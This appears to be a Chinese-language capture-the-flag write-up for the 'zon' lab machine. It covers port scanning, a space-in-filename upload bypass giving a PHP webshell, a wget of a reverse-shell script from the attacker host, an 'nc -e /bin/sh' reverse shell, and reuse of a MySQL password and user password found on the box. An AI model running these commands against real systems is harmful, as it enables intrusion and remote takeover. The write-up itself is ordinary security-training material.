---
title: zon
tags:
  - sec
date: 2024-02-11T10:52:40
lastmod: 2025-09-29T20:52:08
toc: "true"
---
## 启动机器
得指定网络接口
```bash
sudo arp-scan -I eth5 -l
```
![HMM_zon_image_1](https://img.l1uyun.one/HMM_zon_image_1.png)

## 端口扫描

```bash
sudo rustscan -a 192.168.10.13 -r 1-65535 -t 8000 --ulimit 5000

sudo nmap 192.168.10.13 -sT -Pn -p22,80 -sV -sC -O -oN portscan/norm


sudo nmap 192.168.10.13 -sT -Pn -p22,80 --script=vuln -oN portscan/vuln
```

![HMM_zon_image_2](https://img.l1uyun.one/HMM_zon_image_2.png)

![HMM_zon_image_3](https://img.l1uyun.one/HMM_zon_image_3.png)

## 利用空格绕过文件上传过滤
![HMM_zon_image_4](https://img.l1uyun.one/HMM_zon_image_4.png)

测试之后是检查文件名, 而不是文件头, 而且图片马不能正常解析
![HMM_zon_image_5|750](https://img.l1uyun.one/HMM_zon_image_5.png)
- 非 jpeg 格式的无法上传
![HMM_zon_image_6](https://img.l1uyun.one/HMM_zon_image_6.png)

- jpeg 格式能够正常上传
![HMM_zon_image_7](https://img.l1uyun.one/HMM_zon_image_7.png)
![HMM_zon_image_8](https://img.l1uyun.one/HMM_zon_image_8.png)
后面尝试了图片马, 但是没有正常解析, 无法执行命令

使用空格绕过
```bash
"webshell.jpeg .php"
```
![HMM_zon_image_9](https://img.l1uyun.one/HMM_zon_image_9.png)


一句话木马, 获得 webshell
![HMM_zon_image_10](https://img.l1uyun.one/HMM_zon_image_10.png)
freddie
## webshell
上传一个反向 shell
```bash
wget http://192.168.10.11:8000/php-reverse-shell.php -O /tmp/shell.php
```


吐了, 不清楚为啥反向 shell, 不稳定, 执行不了命令, 使用 nohup 也没有稳定下来

```bash
nohup nc -e /bin/sh 192.168.10.11 1234
```
![HMM_zon_image_11|650](https://img.l1uyun.one/HMM_zon_image_11.png)

## 利用脚本中泄露的mysql密码
```bash

#!/bin/bash

# script that checks the database's integrity every minute

dump=/dev/shm/dump.sql
log=/var/log/db_integrity_check.log
true > "${log}"

/usr/bin/mysqldump -u admin -pudgrJbFc6Av#U3 admin credentials > "${dump}"
/usr/bin/sed -i '$d' "${dump}"

hash="29d8e6b76aab0254f7fe439a6a5d2fba64270dde087e6dfab57fa57f6749858a"
check_hash=$(sha256sum "${dump}" | awk '{print $1}')

if [[ "${hash}" != "${check_hash}" ]] ; then
  /usr/bin/wall "Alert ! Database hacked !"
  /usr/bin/du -sh /var/lib/mysql >> "${log}"
  /usr/bin/vmstat 1 3 >> "${log}"
else
  /usr/bin/sync && /usr/bin/echo 3 > /proc/sys/vm/drop_caches
  /usr/bin/echo "$(date) : Integrity check completed for ${dump}" >> "${log}"
fi

```

最后使用 meterpreter 的这个更高级的 shell 成功了
![HMM_zon_image_12](https://img.l1uyun.one/HMM_zon_image_12.png)
## user. txt PWD
```bash
Freddie  | LDVK@dYiEa2I1lnjrEeoMif 
```
![HMM_zon_image_13](https://img.l1uyun.one/HMM_zon_image_13.png)
```bash
ssh freddie@192.168.10.11
LDVK@dYiEa2I1lnjrEeoMif 
```
## 提权

这个逻辑真的没弄懂 ,好像是先配置这个报告程序, 然后利用利用新增报告的功能点, 打开 vim, 然后获取 root
用 GPT 梳理一下逻辑
![HMM_zon_image_14|850](https://img.l1uyun.one/HMM_zon_image_14.png)

![HMM_zon_image_15|650](https://img.l1uyun.one/HMM_zon_image_15.png)
![HMM_zon_image_16|423](https://img.l1uyun.one/HMM_zon_image_16.png)
![HMM_zon_image_17|700](https://img.l1uyun.one/HMM_zon_image_17.png)